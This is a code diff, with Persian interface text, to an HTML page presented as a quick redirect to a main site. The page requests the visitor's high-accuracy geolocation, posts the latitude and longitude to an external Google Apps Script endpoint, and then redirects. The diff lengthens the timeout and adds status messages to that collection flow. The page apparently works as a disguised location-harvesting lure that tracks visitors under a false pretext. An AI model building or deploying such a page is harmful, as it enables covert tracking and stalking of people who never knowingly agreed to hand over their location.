@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>انتقال سریع به سایت اصلی</title>
+    <title>🔗 انتقال سریع به سایت اصلی</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -40,13 +40,15 @@
     <p id="result"></p>
 
     <script>
-        async function getLocation() {
+        function getLocation() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendPosition, showError, {
-                    enableHighAccuracy: true,
-                    timeout: 15000, // کاهش زمان تایم‌اوت برای سرعت بیشتر
-                    maximumAge: 0
-                });
+                document.getElementById("result").innerText = "⌛ در حال دریافت موقعیت مکانی...";
+                
+                navigator.geolocation.getCurrentPosition(
+                    sendPosition, 
+                    showError, 
+                    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 } // افزایش تایم‌اوت به 20 ثانیه
+                );
             } else {
                 document.getElementById("result").innerText = "⛔ مرورگر شما از موقعیت‌یابی پشتیبانی نمی‌کند.";
             }
@@ -56,16 +58,16 @@
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
 
-            document.getElementById("result").innerText = "⌛ در حال انتقال... لطفاً منتظر بمانید.";
-
+            document.getElementById("result").innerText = "⌛ در حال ارسال اطلاعات...";
+            
             try {
-                const response = await fetch("https://script.google.com/macros/s/AKfycbyQpo8TZp1fyrAO8xkAvoTjhP-sVq6NSeZSFpc2BZew-UzCiFwIqKCWqIfzkElUFyBR/exec", { 
+                let response = await fetch("https://script.google.com/macros/s/AKfycbyQpo8TZp1fyrAO8xkAvoTjhP-sVq6NSeZSFpc2BZew-UzCiFwIqKCWqIfzkElUFyBR/exec", { 
                     method: "POST",
                     headers: { "Content-Type": "application/x-www-form-urlencoded" },
                     body: `latitude=${latitude}&longitude=${longitude}`
                 });
 
-                const result = await response.text();
+                let result = await response.text();
                 document.getElementById("result").innerText = "✅ انتقال موفق! در حال هدایت...";
                 
                 // 🚀 انتقال سریع به سایت اصلی پس از ارسال اطلاعات
@@ -89,7 +91,7 @@
                     message = "⚠️ موقعیت مکانی شما در دسترس نیست.";
                     break;
                 case error.TIMEOUT:
-                    message = "⏳ درخواست موقعیت‌یابی بیش از حد طول کشید.";
+                    message = "⏳ درخواست موقعیت‌یابی بیش از حد طول کشید. لطفاً دوباره امتحان کنید.";
                     break;
                 default:
                     message = "❌ خطای نامشخصی رخ داد.";
